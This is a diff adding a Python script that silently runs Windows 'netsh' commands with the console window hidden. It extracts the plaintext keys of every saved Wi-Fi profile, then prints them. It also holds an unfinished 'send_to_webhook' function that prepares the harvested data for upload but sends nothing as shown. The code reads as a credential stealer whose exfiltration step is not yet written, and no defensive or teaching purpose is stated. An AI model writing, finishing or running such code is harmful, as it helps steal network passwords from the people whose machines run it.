@@ -1,0 +1,45 @@
+import subprocess
+import re
+import json
+import urllib.request
+import urllib.error
+
+# Function to run a command and suppress the Command Prompt window
+def run_command(command):
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    return subprocess.run(command, capture_output=True, text=True, startupinfo=startupinfo)
+
+# Function to get Wi-Fi profiles
+def get_wifi_profiles():
+    # Get the list of Wi-Fi profiles using 'netsh wlan show profiles'
+    profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
+    profiles = [line.split(":")[1].strip() for line in profiles_output.stdout.splitlines() if "All User Profile" in line]
+
+    # Create a dictionary to store Wi-Fi profile names and their keys
+    wifi_data = {}
+
+    # Loop through each Wi-Fi profile and extract its name and key
+    for profile in profiles:
+        profile_output = run_command(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"])
+        name_match = re.search(r"Name\s+:\s+(.+)", profile_output.stdout)
+        key_match = re.search(r"Key Content\s+:\s+(.+)", profile_output.stdout)
+        if name_match and key_match:
+            profile_name = name_match.group(1)
+            key_content = key_match.group(1)
+            wifi_data[profile_name] = key_content
+
+    return wifi_data
+
+# Function to send data to a webhook
+def send_to_webhook(data, webhook_url):
+    # Define headers and prepare JSON data
+    headers = {'Content-Type': 'application/json'}
+    data = json.dumps(data).encode('utf-8')
+
+# Example usage:
+if __name__ == "__main__":
+    wifi_profiles = get_wifi_profiles()
+    print("Wi-Fi Profiles and Passwords:")
+    for profile, password in wifi_profiles.items():
+        print(f"{profile}: {password}")
